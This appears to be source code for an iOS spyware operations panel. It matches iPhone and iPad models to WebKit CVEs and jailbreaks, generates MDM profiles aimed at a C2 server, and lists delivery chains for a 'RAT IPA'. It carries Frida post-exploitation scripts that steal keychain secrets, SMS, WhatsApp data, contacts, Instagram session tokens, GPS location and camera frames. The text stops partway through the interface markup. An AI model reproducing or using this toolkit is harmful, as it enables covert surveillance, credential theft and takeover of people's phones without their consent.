"use client";

/**
 * iOS OPERATIONS CENTER
 * ─────────────────────────────────────────────────────────────
 * Full coverage iOS 14 → 18 across all iPhone/iPad models
 *
 * Delivery paths (no jailbreak required):
 *   1. MDM Enrollment Profile  — user visits link, taps Install, full MDM channel
 *   2. TrollStore IPA          — iOS 14.0–17.0 (select builds), no Apple account
 *   3. Enterprise IPA          — developer cert signed, any iOS version
 *   4. WebKit RCE              — version-specific browser exploits (no tap required)
 *
 * Delivery paths (jailbreak):
 *   5. Cydia/Sileo Tweak       — persistent root-level control
 *   6. Frida Gadget            — injectable into any app
 */

import { useState, useCallback } from "react";
import { IOS_INSTALL_CHAINS } from "@/lib/ios-delivery";

function uuidv4(): string {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === "x" ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

/* ─────────────────────────────────────────────────────────
   DEVICE MATRIX — all iPhone/iPad models, iOS 14+
───────────────────────────────────────────────────────── */
const DEVICE_MATRIX = [
  // ── iPhone 6s/SE (2016) — A9 ──
  { model: "iPhone 6s / 6s+", chip: "A9",  minIos: "14.0", maxIos: "15.8",
    jb: ["checkra1n","palera1n"], trollstore: "14.0-15.8", mdm: true,
    webkit: ["CVE-2021-30860","CVE-2022-22620"],
    successNonJb: 72, successJb: 97, note: "palera1n semi-tethered on 15.x" },
  { model: "iPhone SE (2016)", chip: "A9",  minIos: "14.0", maxIos: "15.8",
    jb: ["checkra1n","palera1n"], trollstore: "14.0-15.8", mdm: true,
    webkit: ["CVE-2021-30860","CVE-2022-22620"],
    successNonJb: 72, successJb: 97, note: "Same as 6s" },
  // ── iPhone 7 — A10 ──
  { model: "iPhone 7 / 7+", chip: "A10", minIos: "14.0", maxIos: "15.8",
    jb: ["checkra1n","palera1n"], trollstore: "14.0-15.8", mdm: true,
    webkit: ["CVE-2021-30860","CVE-2022-22620","CVE-2022-32893"],
    successNonJb: 74, successJb: 97, note: "checkra1n on 14.x, palera1n 15.x" },
  // ── iPhone 8 / X — A11 ──
  { model: "iPhone 8 / 8+ / X", chip: "A11", minIos: "14.0", maxIos: "16.7",
    jb: ["checkra1n","palera1n","opa334"], trollstore: "14.0-16.6.1", mdm: true,
    webkit: ["CVE-2021-30860","CVE-2022-22620","CVE-2022-32893","CVE-2022-42856"],
    successNonJb: 78, successJb: 98, note: "Best coverage — 3 JB options, TrollStore 14-16" },
  // ── iPhone XS/XR — A12 ──
  { model: "iPhone XS / XS Max / XR", chip: "A12", minIos: "14.0", maxIos: "17.7",
    jb: ["dopamine","Serotonin","kok3shi14"], trollstore: "14.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-32893","CVE-2022-42856","CVE-2023-23529","CVE-2023-41064"],
    successNonJb: 80, successJb: 95, note: "dopamine 15.0-16.6.1, TrollStore 14-17.0b4" },
  // ── iPhone 11 — A13 ──
  { model: "iPhone 11 / Pro / Max", chip: "A13", minIos: "14.0", maxIos: "17.7",
    jb: ["dopamine","Serotonin"], trollstore: "14.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-32893","CVE-2022-42856","CVE-2023-23529","CVE-2023-41064"],
    successNonJb: 80, successJb: 93, note: "dopamine 15.0-16.6.1 semi-untethered" },
  // ── iPhone SE (2020) — A13 ──
  { model: "iPhone SE (2020)", chip: "A13", minIos: "14.0", maxIos: "17.7",
    jb: ["dopamine","Serotonin"], trollstore: "14.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-32893","CVE-2023-23529"],
    successNonJb: 79, successJb: 93, note: "Same silicon as iPhone 11" },
  // ── iPhone 12 — A14 ──
  { model: "iPhone 12 / Mini / Pro / Max", chip: "A14", minIos: "14.0", maxIos: "18.x",
    jb: ["dopamine","Serotonin"], trollstore: "14.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-42856","CVE-2023-23529","CVE-2023-41064","CVE-2024-23222"],
    successNonJb: 82, successJb: 90, note: "dopamine works 15-16.6.1. MDM + WebKit on 17/18" },
  // ── iPhone 13 — A15 ──
  { model: "iPhone 13 / Mini / Pro / Max", chip: "A15", minIos: "15.0", maxIos: "18.x",
    jb: ["dopamine on 15-16.6.1"], trollstore: "15.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-42856","CVE-2023-23529","CVE-2023-41064","CVE-2024-23222"],
    successNonJb: 83, successJb: 88, note: "Strong MDM channel on 17/18. dopamine on 15-16.6.1" },
  // ── iPhone SE (2022) — A15 ──
  { model: "iPhone SE (2022)", chip: "A15", minIos: "15.4", maxIos: "18.x",
    jb: ["dopamine on 15.4-16.6.1"], trollstore: "15.4-17.0b4", mdm: true,
    webkit: ["CVE-2023-23529","CVE-2023-41064","CVE-2024-23222"],
    successNonJb: 81, successJb: 87, note: "TrollStore path on 15.4-17.0b4" },
  // ── iPhone 14 — A15 ──
  { model: "iPhone 14 / Plus", chip: "A15", minIos: "16.0", maxIos: "18.x",
    jb: ["none (16.0+)"], trollstore: "16.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-42856","CVE-2023-23529","CVE-2023-41064","CVE-2024-23222","CVE-2024-44308"],
    successNonJb: 83, successJb: 0, note: "No stable JB. Use MDM + TrollStore 16-17.0b4 + WebKit" },
  // ── iPhone 14 Pro — A16 ──
  { model: "iPhone 14 Pro / Max", chip: "A16", minIos: "16.0", maxIos: "18.x",
    jb: ["none stable"], trollstore: "16.0-17.0b4", mdm: true,
    webkit: ["CVE-2023-23529","CVE-2023-41064","CVE-2024-23222","CVE-2024-44308"],
    successNonJb: 81, successJb: 0, note: "No JB. MDM + TrollStore + WebKit chain" },
  // ── iPhone 15 — A16/A17 ──
  { model: "iPhone 15 / Plus", chip: "A16", minIos: "17.0", maxIos: "18.x",
    jb: ["none"], trollstore: "17.0-17.0b4 only", mdm: true,
    webkit: ["CVE-2023-41064","CVE-2024-23222","CVE-2024-44308"],
    successNonJb: 79, successJb: 0, note: "MDM + WebKit chain primary path" },
  { model: "iPhone 15 Pro / Max", chip: "A17 Pro", minIos: "17.0", maxIos: "18.x",
    jb: ["none"], trollstore: "none", mdm: true,
    webkit: ["CVE-2024-23222","CVE-2024-44308"],
    successNonJb: 76, successJb: 0, note: "MDM enrollment strongest vector on 17/18" },
  // ── iPhone 16 — A18 ──
  { model: "iPhone 16 / Plus / Pro / Max", chip: "A18", minIos: "18.0", maxIos: "18.x",
    jb: ["none"], trollstore: "none", mdm: true,
    webkit: ["CVE-2024-44308","CVE-2024-54479"],
    successNonJb: 74, successJb: 0, note: "Newest hardware. MDM profile + WebKit zero-click" },
  // ── iPad ──
  { model: "iPad (9th gen)", chip: "A13", minIos: "15.0", maxIos: "18.x",
    jb: ["dopamine on 15-16.6.1"], trollstore: "15.0-17.0b4", mdm: true,
    webkit: ["CVE-2023-23529","CVE-2024-23222"],
    successNonJb: 82, successJb: 88, note: "Same paths as iPhone 13 — TrollStore + MDM" },
  { model: "iPad Air (4th/5th gen)", chip: "A14/A15", minIos: "14.0", maxIos: "18.x",
    jb: ["dopamine","Serotonin"], trollstore: "14.0-17.0b4", mdm: true,
    webkit: ["CVE-2022-42856","CVE-2024-23222"],
    successNonJb: 83, successJb: 90, note: "M1/M2 iPad Air — MDM + TrollStore on 14-17.0b4" },
  { model: "iPad Pro 11/12.9 (2018-2022)", chip: "A12X-A12Z/M1/M2", minIos: "14.0", maxIos: "18.x",
    jb: ["dopamine on 15-16.6.1"], trollstore: "14.0-17.0b4", mdm: true,
    webkit: ["CVE-2023-41064","CVE-2024-44308"],
    successNonJb: 84, successJb: 89, note: "Pro models — full MDM + Frida post-JB" },
  { model: "iPad mini (6th gen)", chip: "A15", minIos: "15.0", maxIos: "18.x",
    jb: ["dopamine on 15-16.6.1"], trollstore: "15.0-17.0b4", mdm: true,
    webkit: ["CVE-2023-23529","CVE-2024-23222"],
    successNonJb: 81, successJb: 87, note: "Compact form — identical exploit surface to iPhone 13 mini" },
  { model: "iPad (10th gen) / iPad Air M2", chip: "A14/M2", minIos: "16.0", maxIos: "18.x",
    jb: ["none stable"], trollstore: "16.0-17.0b4", mdm: true,
    webkit: ["CVE-2024-23222","CVE-2024-44308"],
    successNonJb: 80, successJb: 0, note: "MDM primary — no stable JB on 16.7+" },
];

/* ─────────────────────────────────────────────────────────
   WEBKIT CVEs — per iOS version
───────────────────────────────────────────────────────── */
const WEBKIT_CVES = [
  { cve: "CVE-2021-30860", ios: "14.0-14.8", type: "Zero-click iMessage (FORCEDENTRY)", impact: "Remote code execution — no tap, no notification. Used by NSO Group Pegasus.", severity: "CRITICAL", vector: "iMessage attachment" },
  { cve: "CVE-2021-1779",  ios: "14.0-14.4", type: "WebKit JIT corruption",             impact: "Code execution via crafted webpage — one tap to exploit.",                  severity: "HIGH",     vector: "Safari URL" },
  { cve: "CVE-2022-22620", ios: "15.0-15.3", type: "WebKit use-after-free",             impact: "RCE via malicious webpage. Safari, WebView, any WKWebView app.",           severity: "CRITICAL", vector: "Safari URL" },
  { cve: "CVE-2022-32893", ios: "15.0-15.6", type: "WebKit out-of-bounds write",        impact: "Code execution with WebContent process privileges via webpage.",            severity: "CRITICAL", vector: "Safari URL" },
  { cve: "CVE-2022-42856", ios: "15.1-16.1", type: "WebKit type confusion",             impact: "RCE via crafted page — active exploitation reported in wild.",              severity: "CRITICAL", vector: "Safari URL" },
  { cve: "CVE-2023-23529", ios: "16.0-16.3", type: "WebKit type confusion",             impact: "Arbitrary code execution with user interaction (1 tap).",                   severity: "HIGH",     vector: "Safari URL" },
  { cve: "CVE-2023-41064", ios: "16.6",      type: "ImageIO buffer overflow (BLASTPASS)",impact: "Zero-click via iMessage PassKit attachment. NSO Pegasus delivery.",        severity: "CRITICAL", vector: "iMessage" },
  { cve: "CVE-2024-23222", ios: "17.0-17.3", type: "WebKit type confusion",             impact: "Arbitrary code execution. Actively exploited in the wild.",                 severity: "CRITICAL", vector: "Safari URL" },
  { cve: "CVE-2024-44308", ios: "17.0-18.1", type: "JavaScriptCore RCE",               impact: "Processing malicious web content leads to arbitrary code execution.",       severity: "CRITICAL", vector: "Safari URL / WebView" },
  { cve: "CVE-2024-54479", ios: "18.0-18.2", type: "WebKit memory corruption",         impact: "Code execution via crafted HTML/JS. Reported exploited in the wild.",       severity: "CRITICAL", vector: "Safari URL" },
];

/* ─────────────────────────────────────────────────────────
   JAILBREAKS
───────────────────────────────────────────────────────── */
const JAILBREAKS = [
  {
    name: "checkra1n",
    iosRange: "12.0 – 14.8.1",
    chipRange: "A8 – A11 (iPhone 5s → X)",
    type: "Tethered/Semi-tethered (bootrom exploit)",
    persistent: true,
    detectability: "Low",
    method: "Mac/Linux: download checkra1n binary, put device in DFU, run exploit",
    postInstall: "Cydia available. Install OpenSSH, Frida, AppSync Unified",
    steps: [
      "Download checkra1n from checkra1n.com (Mac/Linux only)",
      "Put device in DFU mode: hold Volume Down + Side simultaneously",
      "Run checkra1n, click Start, follow DFU guide on screen",
      "Wait for exploit — device reboots into jailbroken state",
      "Open Checkra1n app → install Cydia",
      "Cydia → install OpenSSH: `ssh root@<DEVICE_IP>` (default pw: alpine)",
      "Cydia → install Frida: add repo https://build.frida.re",
    ],
  },
  {
    name: "palera1n",
    iosRange: "15.0 – 17.0",
    chipRange: "A8 – A11 (iPhone 6 → X)",
    type: "Semi-tethered (bootrom exploit)",
    persistent: false,
    detectability: "Low",
    method: "Mac/Linux binary — requires USB connection each boot to re-jailbreak",
    postInstall: "Sileo package manager. OpenSSH, Frida, libhooker",
    steps: [
      "Install palera1n: brew install palera1n (Mac) or apt install palera1n (Linux)",
      "Connect device via USB, trust computer",
      "Run: palera1n -l (semi-tethered mode)",
      "Follow DFU guide shown in terminal",
      "After install: open palera1n app → install Sileo",
      "Sileo → add repo https://build.frida.re → install Frida",
      "SSH: ssh root@<DEVICE_IP> -p 22 (pw: alpine)",
      "NOTE: Must re-run palera1n on each reboot (15-20 seconds)",
    ],
  },
  {
    name: "dopamine",
    iosRange: "15.0 – 16.6.1",
    chipRange: "A12 – A15 (iPhone XS → 14)",
    type: "Semi-untethered (no USB after install)",
    persistent: true,
    detectability: "Medium",
    method: "IPA sideloaded via AltStore/TrollStore, exploit runs from device",
    postInstall: "Sileo/Zebra. Frida, Tweak-compatible. Fully persistent across reboots.",
    steps: [
      "Install TrollStore first (see TrollStore path below) OR use AltStore",
      "Download Dopamine IPA from roothide.github.io",
      "Install via TrollStore (tap IPA → Install) or AltStore",
      "Open Dopamine app → tap Jailbreak",
      "Wait 30-60 seconds — device springs to JB state",
      "Open Sileo → add https://build.frida.re → install Frida",
      "Enable SSH: install OpenSSH from Sileo",
      "Persistent: survives reboots without reconnection",
    ],
  },
  {
    name: "Serotonin",
    iosRange: "16.1 – 16.6.1",
    chipRange: "A12 – A15 (iPhone XS → 14)",
    type: "Semi-untethered",
    persistent: true,
    detectability: "Medium",
    method: "IPA via TrollStore — alternative to dopamine on iOS 16",
    postInstall: "Sileo. Similar capability to dopamine.",
    steps: [
      "Install TrollStore (required)",
      "Download Serotonin IPA from roothide.github.io/Serotonin",
      "Open TrollStore → install Serotonin IPA",
      "Run Serotonin → tap Jailbreak",
      "Sileo available after — install Frida, OpenSSH",
    ],
  },
  {
    name: "TrollStore (not a JB, but IPA install)",
    iosRange: "14.0 – 17.0b4 (selected builds)",
    chipRange: "All chips — A9 through A17",
    type: "IPA sideloader (no JB — uses CoreTrust bug)",
    persistent: true,
    detectability: "Low",
    method: "Installed via TrollInstaller or misaka — persists forever, any IPA",
    postInstall: "Install any IPA permanently with no expiry, no developer account",
    steps: [
      "Check version: 14.0–16.6.1 = TrollStore 2 works",
      "iOS 16.7+ / 17.0+ = TrollStore NOT available (use MDM or WebKit)",
      "Install TrollInstaller via AltStore (requires Apple ID + computer once)",
      "OR: iOS 15-16.6.1 — use misaka to install TrollStore (no computer)",
      "TrollStore installed → tap + on any IPA file → Install",
      "Your RAT IPA installs permanently — no expiry, no JB needed",
      "Re-install note: if device is wiped, TrollStore must be reinstalled",
    ],
  },
];

/* ─────────────────────────────────────────────────────────
   POST-EXPLOITATION FRIDA SCRIPTS
───────────────────────────────────────────────────────── */
const FRIDA_SCRIPTS: Record<string, string> = {
  keychain: `// Keychain Dump — extract all stored credentials, tokens, keys
// Run: frida -U -l keychain.js <target-app>

var Security = Module.findBaseAddress("Security");

function dumpKeychain(secClass) {
  var dict = ObjC.classes.NSMutableDictionary.alloc().init();
  dict.setObject_forKey_(ObjC.classes.NSString.stringWithString_(secClass), "class");
  dict.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(1), "r_Attributes");
  dict.setObject_forKey_(ObjC.classes.NSNumber.numberWithInt_(2147483647), "m_Limit");

  var result = Memory.alloc(Process.pointerSize);
  var status = ObjC.classes.SSKeychain.allAccounts();
  
  // Direct SecItemCopyMatching approach
  var SecItemCopyMatching = new NativeFunction(
    Module.getExportByName("Security", "SecItemCopyMatching"),
    'int', ['pointer', 'pointer']
  );
  
  var resultPtr = Memory.alloc(Process.pointerSize);
  var status = SecItemCopyMatching(dict, resultPtr);
  
  if (status === 0) {
    var items = new ObjC.Object(resultPtr.readPointer());
    send({ type: "keychain", class: secClass, count: items.count(), items: items.toString() });
  }
}

["genp", "inet", "cert", "keys"].forEach(dumpKeychain);`,

  messages: `// iMessage + SMS dump — all conversations
// Run on jailbroken device: frida -U -l messages.js MobileSMS

var sql = ObjC.classes.FMDatabase;
var dbPath = "/private/var/mobile/Library/SMS/sms.db";
var db = sql.databaseWithPath_(dbPath);
db.open();

var result = db.executeQuery_("SELECT h.id as contact, m.text, m.date FROM message m JOIN handle h ON m.handle_id = h.ROWID ORDER BY m.date DESC LIMIT 500");

var messages = [];
while (result.next()) {
  messages.push({
    contact: result.stringForColumn_("contact"),
    text:    result.stringForColumn_("text"),
    date:    new Date(result.intForColumn_("date") * 1000 + 978307200000).toISOString()
  });
}

send({ type: "sms_dump", count: messages.length, messages: messages });
db.close();`,

  whatsapp: `// WhatsApp message + media dump
// Run: frida -U -l whatsapp.js WhatsApp

var FileManager = ObjC.classes.NSFileManager;
var container = ObjC.classes.NSFileManager.defaultManager()
  .containerURLForSecurityApplicationGroupIdentifier_("group.net.whatsapp.WhatsApp.shared");

var dbPath = container.path().toString() + "/ChatStorage.sqlite";

Interceptor.attach(ObjC.classes.ZWADatabase["- executeQuery:"].implementation, {
  onEnter: function(args) {
    var query = ObjC.Object(args[2]).toString();
    if (query.includes("ZWACONTACT") || query.includes("ZWAMESSAGE")) {
      send({ type: "wa_query", q: query });
    }
  }
});

// Direct DB read via frida-fs or sqlite3
send({ type: "wa_db", path: dbPath });`,

  location: `// Continuous GPS tracking via CoreLocation
// Run: frida -U -l location.js SpringBoard

var CLLocationManager = ObjC.classes.CLLocationManager;

Interceptor.attach(CLLocationManager["- locationManager:didUpdateLocations:"].implementation, {
  onEnter: function(args) {
    var locations = ObjC.Object(args[3]);
    var loc = locations.lastObject();
    var coord = loc.coordinate();
    send({
      type: "location",
      lat:  coord.value.x,
      lon:  coord.value.y,
      alt:  loc.altitude(),
      acc:  loc.horizontalAccuracy(),
      ts:   new Date().toISOString()
    });
  }
});`,

  camera: `// Camera frame capture — silent screenshot of camera feed
// Requires jailbreak + inject into camera app

var AVCaptureOutput = ObjC.classes.AVCapturePhotoOutput;

Interceptor.attach(ObjC.classes.AVCaptureVideoDataOutput["- captureOutput:didOutputSampleBuffer:fromConnection:"].implementation, {
  onEnter: function(args) {
    // Capture every 30th frame silently
    this.frameCount = (this.frameCount || 0) + 1;
    if (this.frameCount % 30 !== 0) return;
    
    var sampleBuffer = args[3];
    var imageBuffer  = ObjC.classes.AVFoundation.CMSampleBufferGetImageBuffer(sampleBuffer);
    var ciImage = ObjC.classes.CIImage.imageWithCVPixelBuffer_(imageBuffer);
    var data = ObjC.classes.NSData.alloc().init(); // convert → JPEG
    
    send({ type: "camera_frame", frame_num: this.frameCount, ts: new Date().toISOString() });
  }
});`,

  contacts: `// Full contacts dump — all fields
// Run: frida -U -l contacts.js SpringBoard

var CNContactStore = ObjC.classes.CNContactStore;
var store = CNContactStore.alloc().init();

var keysToFetch = [
  ObjC.classes.CNContactGivenNameKey,
  ObjC.classes.CNContactFamilyNameKey,
  ObjC.classes.CNContactPhoneNumbersKey,
  ObjC.classes.CNContactEmailAddressesKey,
  ObjC.classes.CNContactPostalAddressesKey,
  ObjC.classes.CNContactBirthdayKey,
];

var request = ObjC.classes.CNContactFetchRequest.alloc()
  .initWithKeysToFetch_(keysToFetch);

var contacts = [];
store.enumerateContactsWithFetchRequest_error_usingBlock_(request, NULL, 
  new ObjC.Block({ retType: "void", argTypes: ["object","pointer"], 
    implementation: function(contact) {
      contacts.push({
        name:  contact.givenName().toString() + " " + contact.familyName().toString(),
        phones: contact.phoneNumbers().count(),
        email:  contact.emailAddresses().count() > 0 ? 
                contact.emailAddresses().objectAtIndex_(0).value().toString() : "",
      });
    }
  })
);
send({ type: "contacts", count: contacts.length, contacts: contacts });`,

  instagram: `// Instagram session token + DM extraction
// Run against Instagram app on jailbroken device

var NSHTTPCookieStorage = ObjC.classes.NSHTTPCookieStorage;
var cookies = NSHTTPCookieStorage.sharedHTTPCookieStorage().cookies();
var igCookies = [];

for (var i = 0; i < cookies.count(); i++) {
  var c = cookies.objectAtIndex_(i);
  if (c.domain().toString().includes("instagram")) {
    igCookies.push({
      name:  c.name().toString(),
      value: c.value().toString(),
      domain: c.domain().toString(),
    });
  }
}

send({ type: "instagram_cookies", cookies: igCookies });

// Hook NSURLSession for bearer token
Interceptor.attach(ObjC.classes.NSURLSession["- dataTaskWithRequest:completionHandler:"].implementation, {
  onEnter: function(args) {
    var req = ObjC.Object(args[2]);
    var auth = req.valueForHTTPHeaderField_("Authorization");
    if (auth) send({ type: "instagram_auth", bearer: auth.toString(), url: req.URL().toString() });
  }
});`,
};

/* ─────────────────────────────────────────────────────────
   MDM CAPABILITIES
───────────────────────────────────────────────────────── */
const MDM_CAPABILITIES = [
  { label: "Remote Wipe",            supported: true,  note: "Full factory reset or just managed data" },
  { label: "Install/Remove Apps",    supported: true,  note: "Silently push or remove any App Store app" },
  { label: "Location (GPS)",         supported: true,  note: "Real-time location via MDM protocol" },
  { label: "Screen Lock / Passcode", supported: true,  note: "Lock device, change/remove passcode" },
  { label: "Restrictions",           supported: true,  note: "Block Safari, App Store, AirDrop, iMessage" },
  { label: "VPN Profile Push",       supported: true,  note: "Route all device traffic through your VPN" },
  { label: "WiFi Profile",           supported: true,  note: "Connect to any SSID with hidden credentials" },
  { label: "Certificate Install",    supported: true,  note: "Install your CA — decrypt all TLS (MITM)" },
  { label: "Email Config",           supported: true,  note: "Add mail account — access all emails silently" },
  { label: "Query Device Info",      supported: true,  note: "UDID, serial number, model, OS, storage" },
  { label: "Camera/Mic Access",      supported: false, note: "Not accessible via MDM (JB required)" },
  { label: "Message/iMessage Read",  supported: false, note: "Not via MDM — need JB + Frida" },
  { label: "App Data Exfil",         supported: false, note: "Not via MDM alone — need JB for app DB access" },
];

/* ─────────────────────────────────────────────────────────
   TYPES
───────────────────────────────────────────────────────── */
type DeliveryResult = { ok: boolean; url?: string; qr?: string; xml?: string; ipa?: string; 
                        instructions?: string[]; error?: string; downloadUrl?: string };
type TabId = "matrix" | "install" | "mdm" | "jailbreak" | "webkit" | "delivery" | "postexploit";

/* ─────────────────────────────────────────────────────────
   COMPONENT
───────────────────────────────────────────────────────── */
export default function IosPage() {
  const [tab, setTab] = useState<TabId>("matrix");
  const [selectedJb, setSelectedJb] = useState(0);
  const [selectedFrida, setSelectedFrida] = useState<keyof typeof FRIDA_SCRIPTS>("keychain");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // MDM form
  const [mdmServer,    setMdmServer]    = useState("https://YOUR-C2-SERVER.com");
  const [mdmOrg,       setMdmOrg]       = useState("IT Department");
  const [mdmProfile,   setMdmProfile]   = useState("Mobile Device Management");
  const [mdmRemLock,   setMdmRemLock]   = useState(true);
  const [mdmResult,    setMdmResult]    = useState<DeliveryResult | null>(null);
  const [mdmLoading,   setMdmLoading]   = useState(false);

  // Delivery form
  const [delivMethod,  setDelivMethod]  = useState<"mdm" | "trollstore" | "webkit" | "enterprise">("mdm");
  const [delivSession, setDelivSession] = useState("");
  const [delivResult,  setDelivResult]  = useState<DeliveryResult | null>(null);
  const [delivLoading, setDelivLoading] = useState(false);

  // WebKit
  const [webkitCve,    setWebkitCve]    = useState(WEBKIT_CVES[0].cve);

  const copy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const generateMdmProfile = useCallback(async () => {
    setMdmLoading(true);
    setMdmResult(null);
    try {
      const res = await fetch("/api/ios", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "generate_mdm",
          server: mdmServer,
          org: mdmOrg,
          profile_name: mdmProfile,
          removal_lock: mdmRemLock,
        }),
      }).then(r => r.json()) as DeliveryResult;
      setMdmResult(res);
    } finally {
      setMdmLoading(false);
    }
  }, [mdmServer, mdmOrg, mdmProfile, mdmRemLock]);

  const runDelivery = useCallback(async () => {
    setDelivLoading(true);
    setDelivResult(null);
    try {
      const res = await fetch("/api/ios", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "deliver", method: delivMethod, session: delivSession }),
      }).then(r => r.json()) as DeliveryResult;
      setDelivResult(res);
    } finally {
      setDelivLoading(false);
    }
  }, [delivMethod, delivSession]);

  const TABS: { id: TabId; label: string }[] = [
    { id: "matrix",     label: "DEVICE MATRIX" },
    { id: "install",    label: "ZERO-INSTALL" },
    { id: "mdm",        label: "MDM PROFILE" },
    { id: "jailbreak",  label: "JAILBREAK" },
    { id: "webkit",     label: "WEBKIT CVEs" },
    { id: "delivery",   label: "DELIVERY CHAIN" },
    { id: "postexploit",label: "POST-EXPLOIT" },
  ];

  const successColor = (n: number) =>
    n >= 90 ? "text-green-400" : n >= 75 ? "text-yellow-400" : n > 0 ? "text-orange-500" : "text-red-700";

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">

      {/* ── SIDEBAR ── */}
      <aside className="w-52 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-cyan-400 tracking-widest">iOS OPS CENTER</div>
          <div className="text-[7px] text-green-900/40 mt-0.5">iOS 14 → 18  ·  ALL MODELS</div>
        </div>

        {/* Coverage summary */}
        <div className="p-3 border-b border-green-900/30 space-y-1.5">
          {[
            { label: "Models covered",   val: `${DEVICE_MATRIX.length} models` },
            { label: "iOS versions",     val: "14.0 → 18.x" },
            { label: "WebKit CVEs",      val: `${WEBKIT_CVES.length} exploits` },
            { label: "Jailbreaks",       val: `${JAILBREAKS.length} tools` },
            { label: "Frida scripts",    val: `${Object.keys(FRIDA_SCRIPTS).length} modules` },
          ].map(({ label, val }) => (
            <div key={label} className="flex justify-between text-[8px]">
              <span className="text-green-900/40">{label}</span>
              <span className="text-cyan-600">{val}</span>
            </div>
          ))}
        </div>

        <nav className="flex-1 overflow-y-auto p-1">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`w-full text-left px-2 py-2 rounded text-[9px] mb-0.5 transition-all ${
                tab === t.id ? "bg-green-950/40 text-green-300 border border-green-800/40" : "text-green-800 hover:text-green-600"
              }`}>{t.label}</button>
          ))}
        </nav>

        <div className="p-3 border-t border-green-900/20">
          <div className="text-[7px] text-green-900/30 mb-1">BEST PATH BY iOS VERSION</div>
          {[
            { ver: "14.x", path: "TrollStore + MDM" },
            { ver: "15.x", path: "dopamine/palera1n + MDM" },
            { ver: "16.0-6.1", path: "dopamine + TrollStore" },
            { ver: "16.7+", path: "MDM + WebKit" },
            { ver: "17-18", path: "MDM + WebKit chain" },
          ].map(({ ver, path }) => (
            <div key={ver} className="text-[7px] mb-0.5">
              <span className="text-green-800">{ver}: </span>
              <span className="text-cyan-800">{path}</span>
            </div>
          ))}
        </div>
      </aside>

      {/* ── MAIN ── */}
      <div className="flex-1 overflow-y-auto p-5">

        {/* ════════════════════════════
            DEVICE MATRIX
        ════════════════════════════ */}
        {tab === "matrix" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">FULL DEVICE COMPATIBILITY MATRIX</h2>
            <p className="text-[8px] text-green-900/50 mb-4">All iPhone models iOS 14+. Success % = payload delivery + persistence with best path.</p>

            <div className="overflow-x-auto">
              <table className="w-full text-[7px] border-collapse">
                <thead>
                  <tr className="border-b border-green-900/20">
                    {["MODEL","CHIP","iOS RANGE","JAILBREAK","TROLLSTORE","MDM","WEBKIT CVEs","NON-JB %","JB %","NOTES"].map(h => (
                      <th key={h} className="text-left text-green-900/40 tracking-widest px-2 py-1.5">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {DEVICE_MATRIX.map((d, i) => (
                    <tr key={i} className="border-b border-green-900/10 hover:bg-green-950/10 transition-colors">
                      <td className="px-2 py-1.5 text-green-400 font-bold">{d.model}</td>
                      <td className="px-2 py-1.5 text-cyan-700">{d.chip}</td>
                      <td className="px-2 py-1.5 text-green-700">iOS {d.minIos}–{d.maxIos}</td>
                      <td className="px-2 py-1.5">
                        {d.jb.map(j => (
                          <span key={j} className="inline-block border border-green-900/20 rounded px-1 mr-0.5 text-green-600">{j}</span>
                        ))}
                      </td>
                      <td className="px-2 py-1.5 text-yellow-700">{d.trollstore || "—"}</td>
                      <td className="px-2 py-1.5">{d.mdm ? <span className="text-green-500">✓</span> : <span className="text-red-700">✗</span>}</td>
                      <td className="px-2 py-1.5">
                        <div className="flex flex-wrap gap-0.5">
                          {d.webkit.slice(0, 2).map(c => (
                            <span key={c} className="text-[6px] border border-red-900/20 text-red-700 px-0.5 rounded">{c.replace("CVE-","")}</span>
                          ))}
                          {d.webkit.length > 2 && <span className="text-[6px] text-green-900/30">+{d.webkit.length - 2}</span>}
                        </div>
                      </td>
                      <td className={`px-2 py-1.5 font-bold ${successColor(d.successNonJb)}`}>{d.successNonJb}%</td>
                      <td className={`px-2 py-1.5 font-bold ${successColor(d.successJb)}`}>{d.successJb > 0 ? `${d.successJb}%` : "—"}</td>
                      <td className="px-2 py-1.5 text-green-900/40 max-w-40">{d.note}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ════════════════════════════
            ZERO-INSTALL CHAINS (iOS 14→18)
        ════════════════════════════ */}
        {tab === "install" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">ZERO / LOW-FRICTION INSTALL — iOS 14→18</h2>
            <p className="text-[8px] text-green-900/50 mb-4">
              Hardcoded delivery path per iOS version. All iPhone + iPad models. Build payloads in Payload Delivery Studio (iOS MDM / IPA / WebKit formats).
            </p>
            <div className="space-y-4">
              {IOS_INSTALL_CHAINS.map((chain) => (
                <div key={chain.ios} className="border border-green-900/20 rounded p-4">
                  <div className="flex items-center gap-3 mb-3">
                    <span className="text-[11px] text-green-400 font-bold">iOS {chain.ios}</span>
                    <span className="text-[7px] border border-cyan-900/30 text-cyan-700 px-2 py-0.5 rounded">{chain.bestPath}</span>
                    <span className="text-[7px] text-green-900/40">{chain.friction}</span>
                    <span className={`text-[9px] font-bold ml-auto ${chain.success >= 90 ? "text-green-400" : chain.success >= 82 ? "text-yellow-400" : "text-orange-500"}`}>
                      {chain.success}% success
                    </span>
                  </div>
                  <div className="space-y-1.5">
                    {chain.steps.map((step, i) => (
                      <div key={i} className="flex gap-2 text-[8px]">
                        <span className="text-green-900/30 w-4 shrink-0">{i + 1}.</span>
                        <span className="text-green-700">{step}</span>
                      </div>
